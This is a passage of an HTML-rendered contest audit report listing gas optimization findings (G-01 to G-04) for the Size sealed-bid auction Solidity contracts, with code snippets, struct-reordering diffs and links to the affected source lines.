0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 31 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/56\">report highlighted below</a> by <strong>0x1f8b</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/326\">JC</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/322\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/314\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/313\">halden</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/312\">B2</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/305\">Deivitto</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/296\">djxploit</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/295\">lukris02</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/283\">mcwildy</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/273\">gogo</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/229\">TomJ</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/216\">ret2basic</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/211\">ajtra</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/187\">karanctf</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/182\">slowmoses</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/160\">Dinesh11G</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/157\">cryptostellar5</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/155\">Sathish9098</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/139\">Diana</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/133\">aviggiano</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/111\">oyc_109</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/99\">Rolezn</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/91\">gianganhnguyen</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/88\">0xdeadbeef</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/74\">chaduke</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/61\">ReyAdmirado</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/52\">Bnke0x0</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/12\">skyle</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/4\">RaymondFam</a>, and\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/2\">leosathya</a>.</em></p>\n<ul>\n<li><strong>[G-01] Optimize finalize with cancelled bids</strong></li>\n<li><strong>[G-02] Avoid storage keyword during modifiers</strong></li>\n<li><strong>[G-03] Reorder structure layout</strong></li>\n<li><strong>[G-04] Avoid compound assignment operator in state variables</strong></li>\n<li><strong>[G-05] Optimize variable definitions</strong></li>\n<li><strong>[G-06] Optimize finalize conditions</strong></li>\n</ul>\n<h2 id=\"g-01-optimize-finalize-with-cancelled-bids\" style=\"position:relative;\"><a href=\"#g-01-optimize-finalize-with-cancelled-bids\" aria-label=\"g 01 optimize finalize with cancelled bids permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Optimize <code>finalize</code> with cancelled bids</h2>\n<p>When <code>cancelBid</code> is called, the <code>commitment</code> is set to 0 in order to force to fail the <code>computeCommitment</code> comparison.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">cancelBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Prevent any futher access to this EncryptedBid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Prevent seller from finalizing a cancelled bid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">commitment</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p> This can be cheaper if <code>b.pubKey</code> is set to 0,0, because <code>ECCMath.ecMul</code> will return a (1,1) point and it will save all the <code>decryptMessage</code> from cancelled bids.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Point</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharedPoint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ecMul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pubKey</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sellerPriv</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If the bidder public key isn&#39;t on the bn128 curve</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sharedPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">x</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">sharedPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">y</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decryptedMessage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decryptMessage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharedPoint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encryptedMessage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If the bidder didn&#39;t faithfully submit commitment or pubkey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Or the bid was cancelled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">computeCommitment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decryptedMessage</span><span class=\"mtk1\">) != </span><span class=\"mtk12\">b</span><span class=\"mtk1\">.</span><span class=\"mtk12\">commitment</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><em>Note: This also will be more secure because <code>computeCommitment</code> could return 0 with a collision, and process the cancelled bid as valid.</em></p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L258\">SizeSealed.sol:258</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L435\">SizeSealed.sol:435</a></li>\n</ul>\n<h2 id=\"g-02-avoid-storage-keyword-during-modifiers\" style=\"position:relative;\"><a href=\"#g-02-avoid-storage-keyword-during-modifiers\" aria-label=\"g 02 avoid storage keyword during modifiers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Avoid <code>storage</code> keyword during modifiers</h2>\n<p>The problem with using modifiers with storage variables is that these accesses will likely have to be obtained multiple times, to pass it to the modifier, and to read it into the method code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">atState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\">, </span><span class=\"mtk12\">States</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_state</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startTimestamp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_state</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">States</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Created</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTimestamp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_state</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">States</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AcceptingBids</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lowestQuote</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_state</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">States</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Finalized</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hours</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_state</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">States</span><span class=\"mtk1\">.</span><span class=\"mtk12\">RevealPeriod</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hours</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_state</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">States</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Voided</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As you can see the following methods require to extract the <code>Auction</code> twice instead of once, it is recommended to use a method instead of a modifier</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bid</span><span class=\"mtk1\">(...) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">atState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">idToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">], States.AcceptingBids) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">idToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L130-L131\">SizeSealed.sol:130-131</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L179-L181\">SizeSealed.sol:179-181</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L219-L221\">SizeSealed.sol:219-221</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L336-L337\">SizeSealed.sol:336-337</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L359\">SizeSealed.sol:359</a></li>\n</ul>\n<h2 id=\"g-03-reorder-structure-layout\" style=\"position:relative;\"><a href=\"#g-03-reorder-structure-layout\" aria-label=\"g 03 reorder structure layout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Reorder structure layout</h2>\n<p>The following structures could be optimized moving the position of certain values in order to save a lot slots:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    struct EncryptedBid {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       ECCMath.Point pubKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 quoteAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 filledBaseAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 baseWithdrawn;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 commitment;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       ECCMath.Point pubKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 encryptedMessage;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    struct AuctionParameters {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address quoteToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       ECCMath.Point pubKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 reserveQuotePerBase;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 totalBaseAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 minimumBidQuote;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 merkleRoot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       ECCMath.Point pubKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong>Reference:</strong></p>\n<ul>\n<li><a href=\"https://ethdebug.github.io/solidity-data-representation\">https://ethdebug.github.io/solidity-data-representation</a></li>\n</ul>\n<blockquote>\n<p>Enums are represented by integers; the possibility listed first by 0, the next by 1, and so forth. An enum type just acts like uintN, where N is the smallest legal value large enough to accomodate all the possibilities.</p>\n</blockquote>\n<ul>\n<li><a href=\"https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#storage-inplace-encoding\">https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#storage-inplace-encoding</a></li>\n</ul>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L46\">ISizeSealed.sol:46</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/interfaces/ISizeSealed.sol#L83\">ISizeSealed.sol:83</a></li>\n</ul>\n<h2 id=\"g-04-avoid-compound-assignment-operator-in-state-variables\" style=\"position:relative;\"><a href=\"#g-04-avoid-compound-assignment-operator-in-state-variables\" aria-label=\"g 04 avoid compound assignment operator in state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Avoid compound assignment operator in state variables</h2>\n<p>Using compound assignment operators for state variables (like <code>State += X</code> or <code>State -= X</code> …) it’s more expensive than using operator assignment (like <code>State = State + X</code> or <code>State = State - X</code> …).</p>\n<p><strong>Proof of concept (<em>without optimizations</em>):</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">15</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TesterA</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_a</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testShort</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_a</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TesterB</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_a</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testLong</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_a</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_a</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 